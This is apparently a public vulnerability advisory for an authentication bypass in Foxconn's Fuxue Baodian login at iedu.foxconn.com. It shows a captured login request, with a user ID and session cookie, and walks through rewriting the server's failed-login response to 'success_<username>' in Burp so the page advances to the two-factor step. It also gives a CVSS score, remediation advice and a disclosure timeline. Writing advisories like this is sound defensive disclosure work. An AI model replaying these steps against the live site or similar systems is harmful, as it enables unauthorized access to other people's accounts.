## Summary

An Authentication Bypass vulnerability exists in the login mechanism of the Fuxue Baodian website (**iedu.foxconn.com**). The application improperly relies on client-side response data to determine the success of the authentication process. By intercepting the server's response to a failed login attempt and modifying the response body to a successful flag (e.g., `success_[username]`) and updating the `Content-Length` header, a remote attacker can bypass the password verification stage and gain unauthorized access to the subsequent identity verification.



## Affected Product

- **Vendor:** Foxconn
- **Product:** Fuxue Baodian
- **Version:** Current as of 2025-11-20
- **Component:** Login Module
- **Domain:** iedu.foxconn.com

**Note:** The vulnerability was confirmed in the live web application as of 2025-11-20. Since the application does not expose a version string, a specific version number could not be determined.



## Impact

Successful exploitation of this vulnerability allows an attacker to bypass the first authentication layer without knowing the user's valid password. This could lead to:

* **Weakens the Multi-Factor Authentication (MFA) chain:** The security of the account now relies solely on the 2FA method.
* **Information Leakage:** Attackers can potentially confirm valid usernames and reach the identity verification interface, which may expose 2FA-related metadata (e.g., masked phone numbers or email addresses).



## CVSS v3.1 Score

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`

**Base Score:** **6.5 (Medium)**

- AV (Attack Vector): `Network` 
- AC (Attack Complexity): `Low`
- PR (Privileges Required): `None`
- UI (User Interaction): `None`
- S (Scope): `Unchanged`
- C (Confidentiality): `Low`
- I (Integrity): `Low`
- A (Availability): `None`



## Reproduction Steps

![image-20251125095411440](image-20251125095411440.png)

User login request (intentionally entering wrong password `000000`):

```http
POST /action/login/login HTTP/2
Host: iedu.foxconn.com
Cookie: fxbdLocal=zh; deviceid=Wc4d55225cb6c4755a9c00123735d2fc7; zh_choose=t; JSESSIONID=6EF245F519544408A5AD38C4DE8272FA
Content-Length: 57
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-TW,zh;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://iedu.foxconn.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://iedu.foxconn.com/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

preUrl=&userName=F1245363&password=000000&verifyCode=fdjq
```

Intercept the server response for the login request using BurpSuite:

```http
HTTP/2 200 OK
Content-Type: text/plain;charset=UTF-8
Content-Length: 31
X-Frame-Options: ALLOW-FROM https://iedu.foxconn.com/
Expires: Tue, 25 Nov 2025 01:37:05 GMT
Cache-Control: max-age=0, no-cache, no-store
Pragma: no-cache
Date: Tue, 25 Nov 2025 01:37:05 GMT
Strict-Transport-Security: max-age=31536000 ; includeSubDomains ; preload

Password incorrect, 4 attempts remaining
```

Modify the response content by changing the response header `Content-Length` to `16`, and changing the response body to `success_F1245363`:

```http
HTTP/2 200 OK
Content-Type: text/plain;charset=UTF-8
Content-Length: 16
X-Frame-Options: ALLOW-FROM https://iedu.foxconn.com/
Expires: Tue, 25 Nov 2025 01:37:05 GMT
Cache-Control: max-age=0, no-cache, no-store
Pragma: no-cache
Date: Tue, 25 Nov 2025 01:37:05 GMT
Strict-Transport-Security: max-age=31536000 ; includeSubDomains ; preload

success_F1245363
```

Then release the response, observe the subsequent requests, responses, and web page, and you will find that the user login authentication has been successfully bypassed, with the page jumping to the 'two-factor verification' identity verification page, as shown below:

![image-20251125095156888](./image-20251125095156888.png)



## Remediation

* **Server-Side Validation:** The server must independently verify credentials and manage authentication states. Never rely on client-side response bodies or status codes to grant access.
* **Strict MFA Enforcement:** Ensure that the 2FA stage is mandatory and cannot be reached or bypassed without first completing a verified password authentication on the server.



## Timeline
- **2025-11-20:** Vulnerability identified and initial proof-of-concept (PoC) verified.

- **2025-11-28:** Detailed vulnerability report submitted to the vendor for remediation. No acknowledgment or remediation confirmation received as of 2026-01-14.

- **2026-01-14:** Decision made to proceed with public disclosure following the expiration of a reasonable grace period.




## CWE References

* [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
* [CWE-603: Use of Client-Side Authentication](https://cwe.mitre.org/data/definitions/603.html)